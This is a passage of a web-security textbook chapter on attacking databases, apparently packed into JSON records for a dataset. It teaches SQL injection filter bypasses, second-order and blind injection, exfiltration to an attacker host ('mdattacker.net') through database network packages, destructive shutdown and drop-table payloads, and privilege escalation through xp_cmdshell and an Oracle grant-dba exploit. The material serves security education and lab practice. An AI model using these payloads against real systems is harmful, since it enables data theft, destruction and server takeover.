Stores\nn When attempting to inject batched queries into an MS-SQL database,\nyou do not need to use the semicolon separator. Provided that you fi x\nthe syntax of all queries in the batch, the query parser will interpret them\ncorrectly, whether or not you include a semicolon.\nTRY IT!\nhttp://mdsec.net/addressbook/71/\nhttp://mdsec.net/addressbook/76/\nCircumventing Simple Validation\nSome input validation routines employ a simple blacklist and either block or\nremove any supplied data that appears on this list. In this instance, you should\ntry the standard attacks, looking for common defects in validation and canoni-\ncalization mechanisms, as described in Chapter 2. For example, if the SELECT\nkeyword is being blocked or removed, you can try the following bypasses:\nSeLeCt\n%00SELECT\nSELSELECTECT\n%53%45%4c%45%43%54\n%2553%2545%254c%2545%2543%2554\nTRY IT!\nhttp://mdsec.net/addressbook/58/\nhttp://mdsec.net/addressbook/62/\nUsing SQL Comments\nYou can insert inline comments into SQL statements in the same way as for C++,\nby embedding them between the symbols /* and */. If the application blocks\nor strips spaces from your input, you can use comments to simulate whitespace\nwithin your injected data. For example:\nSELECT/*foo*/username,password/*foo*/FROM/*foo*/users\nIn MySQL, comments can even be inserted within keywords themselves,\nwhich provides another means of bypassing some input validation fi lters while\npreserving the syntax of the actual query. For example:\nSEL/*foo*/ECT username,password FR/*foo*/OM users\ncc0099..iinndddd 331122 88//1199//22001111 1122::0099::3311 PPMM"
  },
  {
    "input": "Second-Order SQL Injection",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 313\nChapter 9 n Attacking Data Stores 313\nExploiting Defective Filters\nInput validation routines often contain logic fl aws that you can exploit to smuggle\nblocked input past the fi lter. These attacks often exploit the ordering of multiple\nvalidation steps, or the failure to apply sanitization logic recursively. Some\nattacks of this kind are described in Chapter 11.\nTRY IT!\nhttp://mdsec.net/addressbook/67/\nSecond-Order SQL Injection\nA particularly interesting type of fi lter bypass arises in connection with second-\norder SQL injection. Many applications handle data safely when it is fi rst inserted\ninto the database. Once data is stored in the database, it may later be processed\nin unsafe ways, either by the application itself or by other back-end processes.\nMany of these are not of the same quality as the primary Internet-facing appli-\ncation but have high-privileged database accounts.\nIn some applications, input from the user is validated on arrival by escaping\na single quote. In the original book search example, this approach appears to\nbe effective. When the user enters the search term O’Reilly, the application\nmakes the following query:\nSELECT author,title,year FROM books WHERE publisher = ‘O’’Reilly’\nHere, the single quotation mark supplied by the user has been converted into\ntwo single quotation marks. Therefore, the item passed to the database has the\nsame literal signifi cance as the original expression the user entered.\nOne problem with the doubling-up approach arises in more complex situa-\ntions where the same item of data passes through several SQL queries, being\nwritten to the database and then read back more than once. This is one example\nof the shortcomings of simple inputvalidation as opposed to boundaryvalidation,\nas described in Chapter 2.\nRecall the application that allowed users to self-register and contained a SQL\ninjection fl aw in an INSERT statement. Suppose that developers attempt to fi x\nthe vulnerability by doubling up any single quotation marks that appear within\nuser data. Attempting to register the username foo’ results in the following\nquery, which causes no problems for the database:\nINSERT INTO users (username, password, ID, privs) VALUES (‘foo’’’,\n‘secret’, 2248, 1)\ncc0099..iinndddd 331133 88//1199//22001111 1122::0099::3311 PPMM"
  },
  {
    "input": "Advanced Exploitation",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 314\n314 Chapter 9 n Attacking Data Stores\nSo far, so good. However, suppose that the application also implements a\npassword change function. This function is reachable only by authenticated\nusers, but for extra protection, the application requires users to submit their\nold password. It then verifi es that this is correct by retrieving the user’s cur-\nrent password from the database and comparing the two strings. To do this, it\nfi rst retrieves the user’s username from the database and then constructs the\nfollowing query:\nSELECT password FROM users WHERE username = ‘foo’’\nBecause the username stored in the database is the literal string foo’, this\nis the value that the database returns when this value is queried. The doubled-\nup escape sequence is used only at the point where strings are passed into the\ndatabase. Therefore, when the application reuses this string and embeds it into\na second query, a SQL injection fl aw arises, and the user’s original bad input is\nembedded directly into the query. When the user attempts to change the pass-\nword, the application returns the following message, which reveals the fl aw:\nUnclosed quotation mark before the character string ‘foo\nTo exploit this vulnerability, an attacker can simply register a username\ncontaining his crafted input, and then attempt to change his password. For\nexample, if the following username is registered:\n‘ or 1 in (select password from users where username=’admin’)--\nthe registration step itself will be handled securely. When the attacker tries to\nchange his password, his injected query will be executed, resulting in the fol-\nlowing message, which discloses the admin user’s password:\nMicrosoft OLE DB Provider for ODBC Drivers error ‘80040e07’\n[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting\nthe varchar value ‘fme69’ to a column of data type int.\nThe attacker has successfully bypassed the input validation that was designed\nto block SQL injection attacks. Now he has a way to execute arbitrary queries\nwithin the database and retrieve the results.\nTRY IT!\nhttp://mdsec.net/addressbook/107/\nAdvanced Exploitation\nAll the attacks described so far have had a ready means of retrieving any use-\nful data that was extracted from the database, such as by performing a UNION\nattack or returning data in an error message. As awareness of SQL injection\ncc0099..iinndddd 331144 88//1199//22001111 1122::0099::3311 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 315\nChapter 9 n Attacking Data Stores 315\nthreats has evolved, this kind of situation has become gradually less common.\nIt is increasingly the case that the SQL injection fl aws that you encounter will\nbe in situations where retrieving the results of your injected queries is not\nstraightforward. We will look at several ways in which this problem can arise,\nand how you can deal with it.\nNOTE Application owners should be aware that not every attacker is inter-\nested in stealing sensitive data. Some may be more destructive. For example,\nby supplying just 12 characters of input, an attacker could turn off an MS-SQL\ndatabase with the shutdown command:\n‘ shutdown--\nAn attacker could also inject malicious commands to drop individual tables\nwith commands such as these:\n‘ drop table users--\n‘ drop table accounts--\n‘ drop table customers--\nRetrieving Data as Numbers\nIt is fairly common to fi nd that no string fi elds within an application are vulner-\nable to SQL injection, because input containing single quotation marks is being\nhandled properly. However, vulnerabilities may still exist within numeric data\nfi elds, where user input is not encapsulated within single quotes. Often in these\nsituations, the only means of retrieving the results of your injected queries is\nvia a numeric response from the application.\nIn this situation, your challenge is to process the results of your injected\nqueries in such a way that meaningful data can be retrieved in numeric form.\nTwo key functions can be used here:\nn ASCII, which returns the ASCII code for the input character\nn SUBSTRING (or SUBSTR in Oracle), which returns a substring of its input\nThese functions can be used together to extract a single character from a\nstring in numeric form. For example:\nSUBSTRING(‘Admin’,1,1) returns A.\nASCII(‘A’) returns 65.\nTherefore:\nASCII(SUBSTR(‘Admin’,1,1)) returns 65.\nUsing these two functions, you can systematically cut a string of useful data\ninto its individual characters and return each of these separately, in numeric\nform. In a scripted attack, this technique can be used to quickly retrieve and\nreconstruct a large amount of string-based data one byte at a time.\ncc0099..iinndddd 331155 88//1199//22001111 1122::0099::3311 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 316\n316 Chapter 9 n Attacking Data Stores\nTIP There are numerous subtle variations in how different database plat-\nforms handle string manipulation and numeric computation, which you may\nneed to take into account when performing advanced attacks of this kind. An\nexcellent guide to these differences covering many different databases can be\nfound at http://sqlzoo.net/howto/source/z.dir/i08fun.xml.\nIn a variation on this situation, the authors have encountered cases in which\nwhat is returned by the application is not an actual number, but a resource for\nwhich that number is an identifi er. The application performs a SQL query based\non user input, obtains a numeric identifi er for a document, and then returns the\ndocument’s contents to the user. In this situation, an attacker can fi rst obtain\na copy of every document whose identifi ers are within the relevant numeric\nrange and construct a mapping of document contents to identifi ers. Then, when\nperforming the attack described previously, the attacker can consult this map to\ndetermine the identifi er for each document received from the application and\nthereby retrieve the ASCII value of the character he has successfully extracted.\nUsing an Out-of-Band Channel\nIn many cases of SQL injection, the application does not return the results of\nany injected query to the user’s browser, nor does it return any error messages\ngenerated by the database. In this situation, it may appear that your position is\nfutile. Even if a SQL injection fl aw exists, it surely cannot be exploited to extract\narbitrary data or perform any other action. This appearance is false, however.\nYou can try various techniques to retrieve data and verify that other malicious\nactions have been successful.\nThere are many circumstances in which you may be able to inject an arbitrary\nquery but not retrieve its results. Recall the example of the vulnerable login\nform, where the username and password fi elds are vulnerable to SQL injection:\nSELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’\nIn addition to modifying the query’s logic to bypass the login, you can inject\nan entirely separate subquery using string concatenation to join its results to\nthe item you control. For example:\nfoo’ || (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE\nusername = ‘DBSNMP’) = ‘DBSNMP’)--\nThis causes the application to perform the following query:\nSELECT * FROM users WHERE username = ‘foo’ || (SELECT 1 FROM dual WHERE\n(SELECT username FROM all_users WHERE username = ‘DBSNMP’) = ‘DBSNMP’)\ncc0099..iinndddd 331166 88//1199//22001111 1122::0099::3311 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 317\nChapter 9 n Attacking Data Stores 317\nThe database executes your arbitrary subquery, appends its results to foo,\nand then looks up the details of the resulting username. Of course, the login\nwill fail, but your injected query will have been executed. All you will receive\nback in the application’s response is the standard login failure message. What\nyou then need is a way to retrieve the results of your injected query.\nA different situation arises when you can employ batch queries against MS-SQL\ndatabases. Batch queries are extremely useful, because they allow you to execute\nan entirely separate statement over which you have full control, using a different\nSQL verb and targeting a different table. However, because of how batch queries\nare carried out, the results of an injected query cannot be retrieved directly.\nAgain, you need a means of retrieving the lost results of your injected query.\nOne method for retrieving data that is often effective in this situation is to\nuse an out-of-band channel. Having achieved the ability to execute arbitrary\nSQL statements within the database, it is often possible to leverage some of the\ndatabase’s built-in functionality to create a network connection back to your own\ncomputer, over which you can transmit arbitrary data that you have gathered\nfrom the database.\nThe means of creating a suitable network connection are highly database-\ndependent. Different methods may or may not be available given the privilege\nlevel of the database user with which the application is accessing the database.\nSome of the most common and effective techniques for each type of database\nare described here.\nMS-SQL\nOn older databases such as MS-SQL 2000 and earlier, the OpenRowSet command\ncan be used to open a connection to an external database and insert arbitrary\ndata into it. For example, the following query causes the target database to open\na connection to the attacker’s database and insert the version string of the target\ndatabase into the table called foo:\ninsert into openrowset(‘SQLOLEDB’,\n‘DRIVER={SQL Server};SERVER=mdattacker.net,80;UID=sa;PWD=letmein’,\n‘select * from foo’) values (@@version)\nNote that you can specify port 80, or any other likely value, to increase your\nchance of making an outbound connection through any fi rewalls.\nOracle\nOracle contains a large amount of default functionality that is accessible by\nlow-privileged users and that can be used to create an out-of-band connection.\nThe UTL_HTTP package can be used to make arbitrary HTTP requests to other\nhosts. UTL_HTTP contains rich functionality and supports proxy servers, cookies,\nredirects, and authentication. This means that an attacker who has compromised\ncc0099..iinndddd 331177 88//1199//22001111 1122::0099::3311 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 318\n318 Chapter 9 n Attacking Data Stores\na database on a highly restricted internal corporate network may be able to\nleverage a corporate proxy to initiate outbound connections to the Internet.\nIn the following example, UTL_HTTP is used to transmit the results of an\ninjected query to a server controlled by the attacker:\n/employees.asp?EmpNo=7521’||UTL_HTTP.request(‘mdattacker.net:80/’||\n(SELECT%20username%20FROM%20all_users%20WHERE%20ROWNUM%3d1))--\nThis URL causes UTL_HTTP to make a GET request for a URL containing the\nfi rst username in the table all_users. The attacker can simply set up a netcat\nlistener on mdattacker.net to receive the result:\nC:\\>nc -nLp 80\nGET /SYS HTTP/1.1\nHost: mdattacker.net\nConnection: close\nThe UTL_INADDR package is designed to be used to resolve hostnames to IP\naddresses. It can be used to generate arbitrary DNS queries to a server con-\ntrolled by the attacker. In many situations, this is more likely to succeed than\nthe UTL_HTTP attack, because DNS traffi c is often allowed out through corporate\nfi rewalls even when HTTP traffi c is restricted. The attacker can leverage this\npackage to perform a lookup on a hostname of his choice, effectively retrieving\narbitrary data by prepending it as a subdomain to a domain name he controls.\nFor example:\n/employees.asp?EmpNo=7521’||UTL_INADDR.GET_HOST_NAME((SELECT%20PASSWORD%\n20FROM%20DBA_USERS%20WHERE%20NAME=’SYS’)||’.mdattacker.net’)\nThis results in a DNS query to the mdattacker.net name server containing\nthe SYS user’s password hash:\nDCB748A5BC5390F2.mdattacker.net\nThe UTL_SMTP package can be used to send e-mails. This facility can be used\nto retrieve large volumes of data captured from the database by sending this\nin outbound e-mails.\nThe UTL_TCP package can be used to open arbitrary TCP sockets to send and\nreceive network data.\nNOTE On Oracle 11g, an additional ACL protects many of the resources just\ndescribed from execution by any arbitrary database user. An easy way around\nthis is to dip into the new functionality provided in Oracle 11g and use this code:\nSYS.DBMS_LDAP.INIT((SELECT PASSWORD FROM SYS.USER$ WHERE\nNAME=’SYS’)||’.mdsec.net’,80)\ncc0099..iinndddd 331188 88//1199//22001111 1122::0099::3311 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 319\nChapter 9 n Attacking Data Stores 319\nMySQL\nThe SELECT ... INTO OUTFILE command can be used to direct the output from\nan arbitrary query into a fi le. The specifi ed fi lename may contain a UNC path,\nenabling you to direct the output to a fi le on your own computer. For example:\nselect * into outfile ‘\\\\\\\\mdattacker.net\\\\share\\\\output.txt’ from users;\nTo receive the fi le, you need to create an SMB share on your computer that\nallows anonymous write access. You can confi gure shares on both Windows\nand UNIX-based platforms to behave in this way. If you have diffi culty receiv-\ning the exported fi le, this may result from a confi guration issue in your SMB\nserver. You can use a sniffer to confi rm whether the target server is initiating\nany inbound connections to your computer. If it is, consult your server docu-\nmentation to ensure that it is confi gured correctly.\nLeveraging the Operating System\nIt is often possible to perform escalation attacks via the database that result in\nexecution of arbitrary commands on the operating system of the database server\nitself. In this situation, many more avenues are available to you for retrieving\ndata, such as using built-in commands like tftp,mail, and telnet, or copying\ndata into the web root for retrieval using a browser. See the later section “Beyond\nSQL Injection” for techniques for escalating privileges on the database itself.\nUsing Inference: Conditional Responses\nThere are many reasons why an out-of-band channel may be unavailable. Most\ncommonly this occurs because the database is located within a protected net-\nwork whose perimeter fi rewalls do not allow any outbound connections to the\nInternet or any other network. In this situation, you are restricted to accessing\nthe database entirely via your injection point into the web application.\nIn this situation, working more or less blind, you can use many techniques\nto retrieve arbitrary data from within the database. These techniques are all\nbased on the concept of using an injected query to conditionally trigger some\ndetectable behavior by the database and then inferring a required item of infor-\nmation on the basis of whether this behavior occurs.\nRecall the vulnerable login function where the username and password fi elds\ncan be injected into to perform arbitrary queries:\nSELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’\nSuppose that you have not identifi ed any method of transmitting the results\nof your injected queries back to the browser. Nevertheless, you have already\nseen how you can use SQL injection to modify the application’s behavior.\ncc0099..iinndddd 331199 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 320\n320 Chapter 9 n Attacking Data Stores\nFor example, submitting the following two pieces of input causes very differ-\nent results:\nadmin’ AND 1=1--\nadmin’ AND 1=2--\nIn the fi rst case, the application logs you in as the admin user. In the second\ncase, the login attempt fails, because the 1=2 condition is always false. You\ncan leverage this control of the application’s behavior as a means of inferring\nthe truth or falsehood of arbitrary conditions within the database itself. For\nexample, using the ASCII and SUBSTRING functions described previously, you\ncan test whether a specifi c character of a captured string has a specifi c value. For\nexample, submitting this piece of input logs you in as the admin user, because\nthe condition tested is true:\nadmin’ AND ASCII(SUBSTRING(‘Admin’,1,1)) = 65--\nSubmitting the following input, however, results in a failed login, because\nthe condition tested is false:\nadmin’ AND ASCII(SUBSTRING(‘Admin’,1,1)) = 66--\nBy submitting a large number of such queries, cycling through the range\nof likely ASCII codes for each character until a hit occurs, you can extract the\nentire string, one byte at a time.\nInducing Conditional Errors\nIn the preceding example, the application contained some prominent function-\nality whose logic could be directly controlled by injecting into an existing SQL\nquery. The application’s designed behavior (a successful versus a failed login)\ncould be hijacked to return a single item of information to the attacker. However,\nnot all situations are this straightforward. In some cases, you may be injecting\ninto a query that has no noticeable effect on the application’s behavior, such\nas a logging mechanism. In other cases, you may be injecting a subquery or a\nbatched query whose results are not processed by the application in any way.\nIn this situation, you may struggle to fi nd a way to cause a detectable difference\nin behavior that is contingent on a specifi ed condition.\nDavid Litchfi eld devised a technique that can be used to trigger a detect-\nable difference in behavior in most circumstances. The core idea is to inject\na query that induces a database error contingent on some specifi ed condi-\ntion. When a database error occurs, it is often externally detectable, either\nthrough an HTTP 500 response code or through some kind of error message\nor anomalous behavior (even if the error message itself does not disclose any\nuseful information).\ncc0099..iinndddd 332200 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 321\nChapter 9 n Attacking Data Stores 321\nThe technique relies on a feature of database behavior when evaluating con-\nditional statements: the database evaluates only those parts of the statement\nthat need to be evaluated given the status of other parts. An example of this\nbehavior is a SELECT statement containing a WHERE clause:\nSELECT X FROM Y WHERE C\nThis causes the database to work through each row of table Y, evaluating\ncondition C, and returning X in those cases where condition C is true. If condi-\ntion C is never true, the expression X is never evaluated.\nThis behavior can be exploited by fi nding an expression X that is syntactically\nvalid but that generates an error if it is ever evaluated. An example of such an\nexpression in Oracle and MS-SQL is a divide-by-zero computation, such as 1/0.\nIf condition C is ever true, expression X is evaluated, causing a database error.\nIf condition C is always false, no error is generated. You can, therefore, use the\npresence or absence of an error to test an arbitrary condition C.\nAn example of this is the following query, which tests whether the default\nOracle user DBSNMP exists. If this user exists, the expression 1/0 is evaluated,\ncausing an error:\nSELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username =\n‘DBSNMP’) = ‘DBSNMP’\nThe following query tests whether an invented user AAAAAA exists. Because\nthe WHERE condition is never true, the expression 1/0 is not evaluated, so no\nerror occurs:\nSELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username =\n‘AAAAAA’) = ‘AAAAAA’\nWhat this technique achieves is a way of inducing a conditional response\nwithin the application, even in cases where the query you are injecting has no\nimpact on the application’s logic or data processing. It therefore enables you\nto use the inference techniques described previously to extract data in a wide\nrange of situations. Furthermore, because of the technique’s simplicity, the same\nattack strings will work on a range of databases, and where the injection point\nis into various types of SQL statements.\nThis technique is also versatile because it can be used in all kinds of injection\npoints where a subquery can be injected. For example:\n(select 1 where <<condition>> or 1/0=0)\nConsider an application that provides a searchable and sortable contacts\ndatabase. The user controls the parameters department and sort:\n/search.jsp?department=30&sort=ename\ncc0099..iinndddd 332211 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 322\n322 Chapter 9 n Attacking Data Stores\nThis appears in the following back-end query, which parameterizes the depart-\nment parameter but concatenates the sort parameter onto the query:\nString queryText = “SELECT ename,job,deptno,hiredate FROM emp WHERE deptno = ?\nORDER BY “ + request.getParameter(“sort”) + “ DESC”;\nIt is not possible to alter the WHERE clause, or issue a UNION query after an ORDER\nBY clause; however, an attacker can create an inference condition by issuing the\nfollowing statement:\n/search.jsp?department=20&sort=(select%201/0%20from%20dual%20where%20\n(select%20substr(max(object_name),1,1)%20FROM%20user_objects)=’Y’)\nIf the fi rst letter of the fi rst object name in the user_objects table is equal\nto ‘Y’, this will cause the database to attempt to evaluate 1/0. This will result\nin an error, and no results will be returned by the overall query. If the letter\nis not equal to ‘Y’, results from the original query will be returned in the\ndefault order. Carefully supplying this condition to an SQL injection tool\nsuch as Absinthe or SQLMap, we can retrieve every record in the database.\nUsing Time Delays\nDespite all the sophisticated techniques already described, there may yet be\nsituations in which none of these tricks are effective. In some cases, you may\nbe able to inject a query that returns no results to the browser, cannot be used\nto open an out-of-band channel, and that has no effect on the application’s\nbehavior, even if it induces an error within the database itself.\nIn this situation, all is not lost, thanks to a technique invented by Chris Anley\nand Sherief Hammad of NGSSoftware. They devised a way of crafting a query\nthat would cause a time delay, contingent on some condition specifi ed by the\nattacker. The attacker can submit his query and then monitor the time taken for\nthe server to respond. If a delay occurs, the attacker may infer that the condi-\ntion is true. Even if the actual content of the application’s response is identical\nin the two cases, the presence or absence of a time delay enables the attacker to\nextract a single bit of information from the database. By performing numerous\nsuch queries, the attacker can systematically retrieve arbitrarily complex data\nfrom the database one bit at a time.\nThe precise means of inducing a suitable time delay depends on the target\ndatabase being used. MS-SQL contains a built-in WAITFOR command, which can\nbe used to cause a specifi ed time delay. For example, the following query causes\na time delay of 5 seconds if the current database user is sa:\nif (select user) = ‘sa’ waitfor delay ‘0:0:5’\ncc0099..iinndddd 332222 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 323\nChapter 9 n Attacking Data Stores 323\nEquipped with this command, the attacker can retrieve arbitrary informa-\ntion in various ways. One method is to leverage the same technique already\ndescribed for the case where the application returns conditional responses.\nNow, instead of triggering a different application response when a particular\ncondition is detected, the injected query induces a time delay. For example, the\nsecond of these queries causes a time delay, indicating that the fi rst letter of the\ncaptured string is A:\nif ASCII(SUBSTRING(‘Admin’,1,1)) = 64 waitfor delay ‘0:0:5’\nif ASCII(SUBSTRING(‘Admin’,1,1)) = 65 waitfor delay ‘0:0:5’\nAs before, the attacker can cycle through all possible values for each character\nuntil a time delay occurs. Alternatively, the attack could be made more effi cient\nby reducing the number of requests needed. An additional technique is to break\neach byte of data into individual bits and retrieve each bit in a single query. The\nPOWER command and the bitwise AND operator & can be used to specify condi-\ntions on a bit-by-bit basis. For example, the following query tests the fi rst bit of\nthe fi rst byte of the captured data and pauses if it is 1:\nif (ASCII(SUBSTRING(‘Admin’,1,1)) & (POWER(2,0))) > 0 waitfor delay ‘0:0:5’\nThe following query performs the same test on the second bit:\nif (ASCII(SUBSTRING(‘Admin’,1,1)) & (POWER(2,1))) > 0 waitfor delay ‘0:0:5’\nAs mentioned earlier, the means of inducing a time delay are highly database-\ndependent. In current versions of MySQL, the sleep function can be used to\ncreate a time delay for a specifi ed number of milliseconds:\nselect if(user() like ‘root@%’, sleep(5000), ‘false’)\nIn versions of MySQL prior to 5.0.12, the sleep function cannot be used. An\nalternative is the benchmark function, which can be used to perform a specifi ed\naction repeatedly. Instructing the database to perform a processor-intensive\naction, such as a SHA-1 hash, many times will result in a measurable time\ndelay. For example:\nselect if(user() like ‘root@%’, benchmark(50000,sha1(‘test’)), ‘false’)\nIn PostgreSQL, the PG_SLEEP function can be used in the same way as the\nMySQL sleep function.\nOracle has no built-in method to perform a time delay, but you can use\nother tricks to cause a time delay to occur. One trick is to use UTL_HTTP to\ncc0099..iinndddd 332233 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 324\n324 Chapter 9 n Attacking Data Stores\nconnect to a nonexistent server, causing a timeout. This causes the database\nto attempt to connect to the specifi ed server and eventually time out. For\nexample:\nSELECT ‘a’||Utl_Http.request(‘http://madeupserver.com’) from dual\n...delay...\nORA-29273: HTTP request failed\nORA-06512: at “SYS.UTL_HTTP”, line 1556\nORA-12545: Connect failed because target host or object does not exist\nYou can leverage this behavior to cause a time delay contingent on some\ncondition that you specify. For example, the following query causes a timeout\nif the default Oracle account DBSNMP exists:\nSELECT ‘a’||Utl_Http.request(‘http://madeupserver.com’) FROM dual WHERE\n(SELECT username FROM all_users WHERE username = ‘DBSNMP’) = ‘DBSNMP’\nIn both Oracle and MySQL databases, you can use the SUBSTR(ING)and ASCII\nfunctions to retrieve arbitrary information one byte at a time, as described\npreviously.\nTIP We have described the use of time delays as a means of extracting\ninteresting information. However, the time-delay technique can also be\nimmensely useful when performing initial probing of an application to\ndetect SQL injection vulnerabilities. In some cases of completely blind\nSQL injection, where no results are returned to the browser and all errors\nare handled invisibly, the vulnerability itself may be hard to detect using\nstandard techniques based on supplying crafted input. In this situation,\nusing time delays is often the most reliable way to detect the presence of a\nvulnerability during initial probing. For example, if the back-end database\nis MS-SQL, you can inject each of the following strings into each request\nparameter in turn and monitor how long the application takes to identify\nany vulnerabilities:\n‘; waitfor delay ‘0:30:0’--\n1; waitfor delay ‘0:30:0’--\nTRY IT!\nThis lab example contains a SQL injection vulnerability with no error feed-\nback. You can use it to practice various advanced techniques, including the\nuse of conditional responses and time delays.\nhttp://mdsec.net/addressbook/44/\ncc0099..iinndddd 332244 88//1199//22001111 1122::0099::3322 PPMM"
  },
  {
    "input": "Beyond SQL Injection: Escalating the Database Attack",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 325\nChapter 9 n Attacking Data Stores 325\nBeyond SQL Injection: Escalating the Database Attack\nA successful exploit of a SQL injection vulnerability often results in total com-\npromise of all application data. Most applications employ a single account for\nall database access and rely on application-layer controls to enforce segregation\nof access between different users. Gaining unrestricted use of the application’s\ndatabase account results in access to all its data.\nYou may suppose, therefore, that owning all the application’s data is the\nfi nishing point of a SQL injection attack. However, there are many reasons\nwhy it might be productive to advance your attack further, either by exploiting\na vulnerability within the database itself or by harnessing some of its built-in\nfunctionality to achieve your objectives. Further attacks that can be performed\nby escalating the database attack include the following:\nn If the database is shared with other applications, you may be able to escalate\nprivileges within the database and gain access to other applications’ data.\nn You may be able to compromise the operating system of the database server.\nn You may be able to gain network access to other systems. Typically, the\ndatabase server is hosted on a protected network behind several layers\nof network perimeter defenses. From the database server, you may be in\na trusted position and be able to reach key services on other hosts, which\nmay be further exploitable.\nn You may be able to make network connections back out of the hosting\ninfrastructure to your own computer. This may enable you to bypass the\napplication, easily transmitting large amounts of sensitive data gathered\nfrom the database, and often evading many intrusion detection systems.\nn You may be able to extend the database’s existing functionality in arbitrary\nways by creating user-defi ned functions. In some situations, this may enable\nyou to circumvent hardening that has been performed on the database by\neffectively reimplementing functionality that has been removed or disabled.\nThere is a method for doing this in each of the mainstream databases,\nprovided that you have gained database administrator (DBA) privileges.\nCOMMON MYTH\nMany database administrators assume that it is unnecessary to defend the data-\nbase against attacks that require authentication to exploit. They may reason\nthat the database is accessed by only a trusted application that is owned by the\nsame organization. This ignores the possibility that a fl aw within the applica-\ntion may enable a malicious third party to interact with the database within the\napplication’s security context. Each of the possible attacks just described should\nillustrate why databases need to be defended against authenticated attackers.\ncc0099..iinndddd 332255 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 326\n326 Chapter 9 n Attacking Data Stores\nAttacking databases is a huge topic that is beyond the scope of this book. This\nsection points you toward a few key ways in which vulnerabilities and function-\nality within the main database types can be leveraged to escalate your attack.\nThe key conclusion to draw is that every database contains ways to escalate\nprivileges. Applying current security patches and robust hardening can help\nmitigate many of these attacks, but not all of them. For further reading on this\nhighly fruitful area of current research, we recommend TheDatabaseHacker’s\nHandbook (Wiley, 2005).\nMS-SQL\nPerhaps the most notorious piece of database functionality that an attacker can\nmisuse is the xp_cmdshell stored procedure, which is built into MS-SQL by\ndefault. This stored procedure allows users with DBA permissions to execute\noperating system commands in the same way as the cmd.exe command prompt.\nFor example:\nmaster..xp_cmdshell ‘ipconfig > foo.txt’\nThe opportunity for an attacker to misuse this functionality is huge. He can\nperform arbitrary commands, pipe the results to local fi les, and read them back.\nHe can open out-of-band network connections back to himself and create a\nbackdoor command and communications channel, copying data from the server\nand uploading attack tools. Because MS-SQL runs by default as LocalSystem,\nthe attacker typically can fully compromise the underlying operating system,\nperforming arbitrary actions. MS-SQL contains a wealth of other extended\nstored procedures, such as xp_regread and xp_regwrite, that can be used to\nperform powerful actions within the registry of the Windows operating system.\nDealing with Default Lockdown\nMost installations of MS-SQL encountered on the Internet will be MS-SQL 2005\nor later. These versions contain numerous security features that lock down the\ndatabase by default, preventing many useful attack techniques from working.\nHowever, if the web application’s user account within the database is suf-\nfi ciently high-privileged, it is possible to overcome these obstacles simply by\nreconfi guring the database. For example, if xp_cmdshell is disabled, it can be\nre-enabled with the sp_configure stored procedure. The following four lines\nof SQL do this:\nEXECUTE sp_configure ‘show advanced options’, 1\nRECONFIGURE WITH OVERRIDE\nEXECUTE sp_configure ‘xp_cmdshell’, ‘1’\nRECONFIGURE WITH OVERRIDE\ncc0099..iinndddd 332266 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 327\nChapter 9 n Attacking Data Stores 327\nAt this point, xp_cmdshell is re-enabled and can be run with the usual\ncommand:\nexec xp_cmdshell ‘dir’\nOracle\nA huge number of security vulnerabilities have been found within the Oracle\ndatabase software itself. If you have found a SQL injection vulnerability that\nenables you to perform arbitrary queries, typically you can escalate to DBA\nprivileges by exploiting one of these vulnerabilities.\nOracle contains many built-in stored procedures that execute with DBA privi-\nleges and have been found to contain SQL injection fl aws within the procedures\nthemselves. A typical example of such a fl aw existed in the default package\nSYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES prior to the July 2006\ncritical patch update. This can be exploited to escalate privileges by injecting\nthe query grant DBA to public into the vulnerable fi eld:\nselect SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(‘INDX’,’SCH’,\n‘TEXTINDEXMETHODS”.ODCIIndexUtilCleanup(:p1); execute immediate\n‘’declare pragma autonomous_transaction; begin execute immediate\n‘’’’grant dba to public’’’’ ; end;’’; END;--’,’CTXSYS’,1,’1’,0) from dual\nThis type of attack could be delivered via a SQL injection fl aw in a web appli-\ncation by injecting the function into the vulnerable parameter.\nIn addition to actual vulnerabilities like these, Oracle also contains a large\namount of default functionality. It is accessible by low-privileged users and\ncan be used to perform undesirable actions, such as initiating network connec-\ntions or accessing the fi lesystem. In addition to the powerful packages already\ndescribed for creating out-of-band connections, the package UTL_FILE can be\nused to read from and write to fi les on the database server fi lesystem.\nIn 2010, David Litchfi eld demonstrated how Java can be abused in Oracle 10g\nR2 and 11g to execute operating system commands. This attack fi rst exploits a\nfl aw in DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY to grant the current user the\npermission java.io.filepermission. The attack then executes a Java class\n(oracle/aurora/util/Wrapper) that runs an OS command, using DBMS_JAVA.\nRUNJAVA. For example:\nDBMS_JAVA.RUNJAVA(‘oracle/aurora/util/Wrapper c:\\\\windows\\\\system32\\\\\ncmd.exe /c dir>c:\\\\OUT.LST’)\nMore details can be found here:\nn www.databasesecurity.com/HackingAurora.pdf\nn www.notsosecure.com/folder2/2010/08/02/blackhat-2010/\ncc0099..iinndddd 332277 88//1199//22001111 1122::0099::3322 PPMM"
  },
  {
    "input": "Using SQL Exploitation Tools",
